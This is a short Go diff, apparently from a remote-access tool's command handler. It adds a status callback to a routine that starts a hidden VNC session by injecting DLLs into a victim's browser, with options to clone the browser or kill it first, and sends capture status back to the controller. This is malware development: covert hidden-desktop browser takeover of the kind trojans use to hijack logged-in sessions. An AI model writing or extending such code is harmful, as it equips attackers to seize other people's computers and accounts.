@@ -1559,7 +1559,15 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 					})
 				}
 			}
-			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, onProgress); err != nil {
+			onDXGIStatus := func(success bool, gpuPID uint32, message string) {
+				_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCDXGIStatus{
+					Type:    "hvnc_dxgi_status",
+					Success: success,
+					GPUPid:  gpuPID,
+					Message: message,
+				})
+			}
+			if err := capture.StartHVNCBrowserInjected(browser, exePath, dllBytes, captureDllBytes, clone, cloneLite, killIfRunning, onProgress, onDXGIStatus); err != nil {
 				log.Printf("hvnc: browser injected failed for %q: %v", browser, err)
 			}
 		})
